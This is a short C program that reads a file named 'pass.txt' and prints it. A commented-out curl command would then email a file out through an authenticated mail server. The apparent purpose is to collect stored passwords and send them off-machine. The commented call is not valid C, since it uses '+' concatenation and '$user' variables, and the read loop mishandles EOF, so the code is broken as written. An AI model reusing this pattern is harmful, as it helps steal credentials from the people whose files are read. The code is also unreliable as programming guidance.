#include <stdio.h>
#include <stdlib.h>

int main() {
    char ch;
    char filename[] = "pass.txt";
    FILE *fp;
    fp = fopen(filename, "r");
    while((ch = fgetc(fp)) != EOF)
      printf("%c", ch);
    /*system("curl --ssl-reqd --url " +
    " --user "
    +$user
    +" --mail-from" 
    +$mailusername 
    +" --mail-rcpt "
    +$mailusername 
    +" --upload-file mail.txt")
    */
   return 0;
}